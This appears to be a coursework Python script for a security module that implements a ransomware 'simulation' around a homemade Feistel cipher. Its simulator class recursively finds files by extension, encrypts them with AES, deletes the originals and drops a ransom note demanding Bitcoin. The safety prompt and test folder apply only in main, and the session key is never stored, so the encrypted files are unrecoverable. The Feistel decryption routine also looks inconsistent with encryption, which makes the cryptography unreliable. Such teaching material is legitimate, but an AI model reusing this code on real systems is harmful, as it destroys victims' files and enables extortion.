import os
import sys
import json
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad
import hashlib
import random

# =============================================
# Feistel Network Implementation (Core Cipher)
# =============================================

class FeistelCipher:
    def __init__(self, rounds=16, key=None):
        self.rounds = rounds
        self.key = key or self.generate_key()
        self.subkeys = self.generate_subkeys()
        
    def generate_key(self):
        """Generate a 256-bit master key"""
        return get_random_bytes(32)
    
    def generate_subkeys(self):
        """Derive round keys from master key using SHA-256"""
        subkeys = []
        for i in range(self.rounds):
            h = hashlib.sha256(self.key + i.to_bytes(4, 'big'))
            subkeys.append(h.digest()[:8])  # Use first 8 bytes as subkey
        return subkeys
    
    def round_function(self, data, round_key):
        """Combination of three classical ciphers:
        1. Caesar substitution (shift bytes)
        2. Columnar transposition
        3. Vigenère-like XOR operation
        """
        # 1. Caesar shift each byte by round_key[0] % 8
        shift = round_key[0] % 8
        shifted = bytes((b + shift) % 256 for b in data)
        
        # 2. Columnar transposition (simple swap)
        transposed = shifted[4:] + shifted[:4]
        
        # 3. Vigenère XOR with round_key
        xored = bytes(b ^ round_key[i % len(round_key)] for i, b in enumerate(transposed))
        
        return xored
    
    def encrypt_block(self, block):
        """Encrypt a 64-bit (8-byte) block using Feistel network"""
        left, right = block[:4], block[4:]
        
        for i in range(self.rounds):
            new_right = bytes(a ^ b for a, b in zip(left, self.round_function(right, self.subkeys[i])))
            left, right = right, new_right
        
        return right + left
    
    def decrypt_block(self, block):
        """Decrypt a 64-bit (8-byte) block using Feistel network"""
        left, right = block[:4], block[4:]
        
        for i in reversed(range(self.rounds)):
            new_left = bytes(a ^ b for a, b in zip(right, self.round_function(left, self.subkeys[i])))
            right, left = left, new_left
        
        return left + right
    
    def encrypt(self, data):
        """Encrypt arbitrary-length data using block cipher mode"""
        padded = pad(data, 8)
        encrypted = b''
        
        for i in range(0, len(padded), 8):
            block = padded[i:i+8]
            encrypted += self.encrypt_block(block)
            
        return encrypted
    
    def decrypt(self, data):
        """Decrypt data encrypted with this cipher"""
        decrypted = b''
        
        for i in range(0, len(data), 8):
            block = data[i:i+8]
            decrypted += self.decrypt_block(block)
            
        return unpad(decrypted, 8)

# =============================================
# Ransomware Simulation Components
# =============================================

class RansomwareSimulator:
    def __init__(self):
        self.session_key = get_random_bytes(32)
        self.feistel_cipher = FeistelCipher(key=self.session_key)
        self.victim_id = hashlib.sha256(get_random_bytes(16)).hexdigest()[:8]
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.png', '.sql', '.mdb', '.csv', '.psd'
        ]
        self.ransom_note = f"""
        !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
        
        To recover your files, send 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
        Then email your ID [{self.victim_id}] to: payment@example.com
        
        You have 72 hours to comply before your decryption key is destroyed.
        
        NOTE: This is an academic simulation only. No actual files were harmed.
        """
    
    def scan_files(self, path):
        """Recursively scan for target file extensions"""
        encrypted_files = []
        
        for root, _, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in self.target_extensions):
                    full_path = os.path.join(root, file)
                    encrypted_files.append(full_path)
        
        return encrypted_files
    
    def encrypt_file(self, file_path):
        """Encrypt a file using hybrid encryption"""
        try:
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            file_key = get_random_bytes(32)
            cipher_aes = AES.new(file_key, AES.MODE_CBC)
            encrypted_data = cipher_aes.encrypt(pad(original_data, AES.block_size))
            encrypted_key = self.feistel_cipher.encrypt(file_key + cipher_aes.iv)
            
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(encrypted_key + encrypted_data)
            
            os.remove(file_path)
            return True
            
        except Exception as e:
            print(f"Error encrypting {file_path}: {str(e)}")
            return False
    
    def simulate_infection(self, path):
        """Simulate ransomware behavior in specified path"""
        print(f"[*] Targeting ONLY: {os.path.abspath(path)}")
        target_files = self.scan_files(path)
        
        print(f"[*] Found {len(target_files)} files to encrypt")
        success_count = 0
        
        for file in target_files:
            if self.encrypt_file(file):
                success_count += 1
        
        print(f"[*] Successfully encrypted {success_count}/{len(target_files)} files")
        
        with open(os.path.join(path, "READ_ME.txt"), "w") as f:
            f.write(self.ransom_note)
        
        print("[*] Ransom note created as READ_ME.txt")

# =============================================
# Safety Checks and Main Execution
# =============================================

def create_safe_test_environment():
    """Create a dedicated test folder with sample files"""
    test_dir = "ransomware_simulation_test"
    if not os.path.exists(test_dir):
        os.makedirs(test_dir)
    
    # Create sample files
    sample_files = [
        "document_1.txt", "report.docx", "data.xlsx",
        "image.jpg", "notes.pdf"
    ]
    
    for file in sample_files:
        with open(os.path.join(test_dir, file), "w") as f:
            f.write(f"This is a sample {file.split('.')[-1]} file for academic testing.\n")
            f.write("THIS IS A SAFE SIMULATION - NO REAL FILES ARE AFFECTED.\n")
    
    return test_dir

def main():
    print("""
    ============================================
    Feistel-Based Ransomware Simulation
    CIS6006 Cyber Security and Cryptography
    Academic Exercise Only - Not Actual Malware
    ============================================
    """)
    
    # Enhanced safety confirmation
    print("\n[!] SAFETY WARNING [!]")
    print("This simulation will create encrypted copies of files and delete originals")
    print("in a controlled test environment for academic purposes only.\n")
    
    response = input("Do you understand this is for academic use only? (yes/no): ").lower()
    if response != 'yes':
        print("[!] Simulation aborted. No changes were made.")
        sys.exit(0)
    
    # Create safe test environment
    test_dir = create_safe_test_environment()
    print(f"\n[*] Created safe test environment in: {os.path.abspath(test_dir)}")
    
    # Run simulation
    ransomware = RansomwareSimulator()
    ransomware.simulate_infection(test_dir)
    
    print("\n[!] SIMULATION COMPLETE")
    print(f"All operations were confined to: {os.path.abspath(test_dir)}")
    print("This was an academic exercise only - no real systems were affected.")

if __name__ == "__main__":
    main()